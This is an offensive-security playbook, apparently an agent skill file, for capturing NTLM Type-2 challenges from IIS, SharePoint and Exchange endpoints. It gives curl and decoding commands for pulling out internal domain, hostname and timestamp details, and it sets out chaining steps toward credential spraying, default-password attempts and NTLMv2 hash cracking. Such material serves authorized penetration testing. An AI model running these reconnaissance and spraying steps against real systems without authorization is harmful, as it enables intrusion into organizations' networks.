---
name: hunt-ntlm-info
description: "Hunt NTLM/Negotiate information disclosure on internet-reachable IIS/SharePoint/Exchange. Anonymous NTLM Type-2 challenge capture leaks NetBIOS domain, internal DNS forest, computer name, AD timestamp. Default Windows-installer hostnames (WIN-XXXXXXXXXXX) signal lazy provisioning. Use when target advertises WWW-Authenticate: NTLM or Negotiate headers anonymously."
sources: github, authorized-engagement
report_count: 1
---

# HUNT-NTLM-INFO — NTLM Information Disclosure

## Crown Jewel Targets
NTLM info disclosure is Medium when isolated, but chains to High/Critical:
- Internal AD domain disclosure (parent-forest mapping)
- Default-Windows-hostname disclosure (WIN-XXXXXXXX → likely default passwords)
- Timestamp leak (NTLMv2 hash cracking acceleration)
- Attack-map enrichment for credential spraying

**Targets:** IIS, SharePoint, Exchange, OWA, Lync/Skype, Citrix NetScaler, WSUS

## Attack Surface Signals
```
WWW-Authenticate: NTLM
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM, Negotiate
```

Common URL patterns:
```
/_api/web/CurrentUser          (SharePoint)
/EWS/Exchange.asmx             (Exchange)
/Autodiscover/Autodiscover.xml
/owa/                          (Outlook Web App)
/Microsoft-Server-ActiveSync
/PowerShell
```

## Phase 1 — Collect NTLM Type-2 Challenge
```bash
# Capture NTLM type-2 challenge from any NTLM-advertising endpoint
curl -sk -v "https://$TARGET/owa/" 2>&1 | grep -i "WWW-Authenticate"

# Force NTLM auth (send Type-1 message)
curl -sk --ntlm -u ":" "https://$TARGET/_api/web/CurrentUser" -o /dev/null -D -

# Use ntlm-info extractor
git clone https://github.com/exploitagency/ntlm-info-extractor
python ntlm-info-extractor/extract.py --url https://$TARGET/_api/web/CurrentUser

# Manual: capture raw WWW-Authenticate header and base64-decode the challenge
echo "<BASE64_CHALLENGE>" | base64 -d | xxd | head -20
```

## Phase 2 — Extract AD Information
From the decoded Type-2 challenge:
```
Target Name (NetBIOS domain):      CORP
Target Name (DNS domain):          corp.example.com
DNS Forest Name:                   corp.example.com
Target Computer Name:              WIN-XXXXXXXXXXX
Target OS Version:                 ... (from AV_PAIRS)
Timestamp:                         hex → epoch (for NTLMv2 cracking)
```

## Phase 3 — Chain to Next Stage
- **WIN-XXXX pattern** → try default SPN/service passwords → `hunt-auth-bypass`
- **Internal domain** → `hunt-ato` credential spray
- **Forest name** → `m365-entra-attack` tenant-to-forest mapping

## Related Skills
- **hunt-auth-bypass** — credential spray against discovered domain
- **hunt-sharepoint** — NTLM is common on SharePoint farms
- **triage-validation** — 7-Question Gate
